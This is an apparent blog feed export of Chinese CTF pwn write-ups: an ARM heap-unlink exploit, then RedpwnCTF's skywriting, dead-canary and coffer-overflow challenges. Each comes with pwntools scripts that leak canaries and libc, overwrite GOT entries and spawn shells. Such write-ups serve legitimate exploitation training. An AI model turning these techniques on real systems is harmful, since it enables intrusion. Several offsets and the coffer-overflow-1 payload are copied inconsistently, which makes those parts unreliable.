class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])*<span class="number">5</span>+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])*<span class="number">4</span></span><br><span class="line">change(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">show()</span><br><span class="line">……</span><br><span class="line">change(<span class="number">2</span>,<span class="number">4</span>,p32(system))</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><blockquote><p>来自师兄的exp，我删了多余的堆，和调整了一下填充内容。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @File    : exp.py</span></span><br><span class="line"><span class="comment"># @Author  : hope</span></span><br><span class="line"><span class="comment"># @site    : https://hop11.github.io/</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;a.out&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    sh = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    sh = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;a.out&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;a.out&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;a.out&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># 本地 libc</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libuClibc-1.0.34.so&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">length,content=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Length:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Tag:&quot;</span>)</span><br><span class="line">sh.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">index,length,content</span>):</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Length:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Tag:&quot;</span>)</span><br><span class="line">sh.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">index</span>):</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Tag:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="comment"># 堆数组地址</span></span><br><span class="line">target = <span class="number">0x002106C</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0 溢出</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#1 被溢出</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2 用来修改函数</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#3 传参</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">payload = p32(<span class="number">0</span>)+p32(<span class="number">0x11</span>)+p32(target-<span class="number">12</span>)+p32(target-<span class="number">8</span>)</span><br><span class="line">payload += p32(<span class="number">0x10</span>)+p32(<span class="number">0x88</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = p32(<span class="number">0x0</span>)*<span class="number">3</span>+p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0x0</span>)*<span class="number">3</span>+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">change(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&quot;0 : &quot;</span>)</span><br><span class="line"></span><br><span class="line">puts = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;puts:&#x27;</span>+<span class="built_in">hex</span>(puts)</span><br><span class="line">libc_base = puts - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite free</span></span><br><span class="line">change(<span class="number">2</span>,<span class="number">4</span>,p32(system))</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 第五空间 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 RedpwnCTF Writeup</title>
      <link href="archives/18e23abd/"/>
      <url>archives/18e23abd/</url>
      
        <content type="html"><![CDATA[<h2 id="skywriting"><a href="#skywriting" class="headerlink" title="skywriting"></a>skywriting</h2><p>简单 canary 保护绕过，复盘连不上官方环境，exp 本地版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : skywriting.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./skywriting&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./skywriting&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;sky?&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;shot: &quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x88</span>+<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x88</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>))-<span class="number">0x2d</span></span><br><span class="line">log.info(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;shot: &quot;</span>,<span class="string">&quot;a&quot;</span>*(<span class="number">0x7fffffffdca8</span>-<span class="number">0x7fffffffdc10</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*(<span class="number">0x7fffffffdca8</span>-<span class="number">0x7fffffffdc10</span>))</span><br><span class="line">libc_start_main = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;libc_start_main:&quot;</span>+<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">libc_base = libc_start_main - <span class="number">0x20830</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">onegadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;notflag&#123;a_cloud_is_just_someone_elses_computer&#125;\n\x00&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(canary) + p64(canary) + p64(onegadget)</span><br><span class="line">p.sendafter(<span class="string">&quot;shot: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="dead-canary"><a href="#dead-canary" class="headerlink" title="dead-canary"></a>dead-canary</h2><p>一开始做的时候没有想到可以覆盖 __stack_chk_fail  got 表地址，一心想着绕过 canary ，然后就困惑着怎么 ROP 。</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>通过故意破坏 canary 的值触发程序执行 __stack_chk_fail ，而这个函数 got 函数已知，在触发之前将这个函数覆盖为 main 函数，完成 ROP 。</p><p>在第一轮输入的时候：泄露 __libc_start_main ；泄露 canary ；改写 __stack_chk_fail got 表为 main 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%41$p%39$p%40$p&quot;</span> + <span class="string">&quot;%4196117c%10$n--&gt;&quot;</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&quot;__stack_chk_fail&quot;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>-<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += <span class="string">&#x27;\x2d&#x27;</span></span><br></pre></td></tr></table></figure><p>第二轮输入时候恢复 canary 、控制 rip 为 onegadget 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;skye&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x110</span>-<span class="number">8</span>-<span class="number">4</span>) + p64(canary)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>) + p64(onegadget)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : dead-canary.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./dead-canary&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./dead-canary&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%41$p%39$p&lt;&gt;&quot;</span> + <span class="string">&quot;%4196117c%10$n-----&gt;&quot;</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&quot;__stack_chk_fail&quot;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>-<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += <span class="string">&#x27;\x2d&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x4007F3&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello &quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;libc_start_main:&quot;</span>+<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>) - <span class="number">0x2d</span></span><br><span class="line">log.info(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">libc_base = libc_start_main - <span class="number">0x20830</span></span><br><span class="line">log.info(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">onegadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;skye&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x110</span>-<span class="number">8</span>-<span class="number">4</span>) + p64(canary)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>) + p64(onegadget)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ctftime 上看到外国小哥最后 getshell 有用 stack pivoting 。emmm 还得搞个 rbp 算偏移 emmm</p><h2 id="coffer-overflow-0"><a href="#coffer-overflow-0" class="headerlink" title="coffer-overflow-0"></a>coffer-overflow-0</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况"><a href="#保护情况" class="headerlink" title="保护情况"></a>保护情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h4 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>题目给了程序源代码，但是我们还是按照正常题目做法分析二进制文件。</p><p>漏洞就在 main 中，gets 函数存在栈溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to coffer overflow, where our coffers are overfilling with bytes ;)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to fill your coffer with?&quot;</span>);</span><br><span class="line">  gets(&amp;v4, <span class="number">0LL</span>);                               <span class="comment">// 栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main 函数中在存在着 <code>system(&quot;/bin/sh&quot;)</code> 的后门函数。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>程序用 gets 函数存在栈溢出漏洞，而进入后门函数需要判断 v5 的布尔值。这里就有两种做法，一种利用栈溢出修改栈上变量 v5 的值，从而让程序正常进入 后门函数 ；第二种就是栈溢出修改 rip 的返回地址到 <code>system(&quot;/bin/sh&quot;)</code>  。两种做法都可行，我采用第一种。</p><p>首先就是确定 v5 变量在栈上的位置。可以从 IDA 变量后面的注释去分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">__int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br></pre></td></tr></table></figure><p>v4 距离 rbp 0x20 ；v5 距离 rbp 0x8；那么可以得出 v4 距离 v5 0x16(0x20-0x8)。</p><p>确定填充长度之后就是填充内容了，if 条件检查的是 v5 的布尔值，那么就赋值一个 1 即可条件成立，进入后门函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0xcafebabe</span>)</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : coffer-overflow-0.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./coffer-overflow-0&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;2020.redpwnc.tf&quot;</span>,<span class="number">31199</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./coffer-overflow-0&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0X1</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;with?\n&quot;</span>,payload) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="coffer-overflow-1"><a href="#coffer-overflow-1" class="headerlink" title="coffer-overflow-1"></a>coffer-overflow-1</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况-1"><a href="#保护情况-1" class="headerlink" title="保护情况"></a>保护情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h4 id="漏洞函数-1"><a href="#漏洞函数-1" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>题目给了程序源代码，但是我们还是按照正常题目做法分析二进制文件。</p><p>漏洞就在 main 中，gets 函数存在栈溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to coffer overflow, where our coffers are overfilling with bytes ;)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to fill your coffer with?&quot;</span>);</span><br><span class="line">  gets(&amp;v4, <span class="number">0LL</span>);                               <span class="comment">// 栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">3405691582LL</span> )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main 函数中在存在着 <code>system(&quot;/bin/sh&quot;)</code> 的后门函数。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>程序用 gets 函数存在栈溢出漏洞，而进入后门函数需要判断 v5 的值是否为 <code>0xCAFEBABE</code> 。这里就有两种做法，一种利用栈溢出修改栈上变量 v5 的值，从而让程序正常进入 后门函数 ；第二种就是栈溢出修改 rip 的返回地址到 <code>system(&quot;/bin/sh&quot;)</code>  。两种做法都可行，我采用第一种。</p><p>首先就是确定 v5 变量在栈上的位置。可以从 IDA 变量后面的注释去分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">__int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br></pre></td></tr></table></figure><p>v4 距离 rbp 0x20 ；v5 距离 rbp 0x8；那么可以得出 v4 距离 v5 0x16(0x20-0x8)。</p><p>确定填充长度之后就是填充内容了，if 条件检查的是 v5 的布尔值，那么就赋值一个 1 即可条件成立，进入后门函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0X1</span>)</span><br></pre></td></tr></table></figure><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : 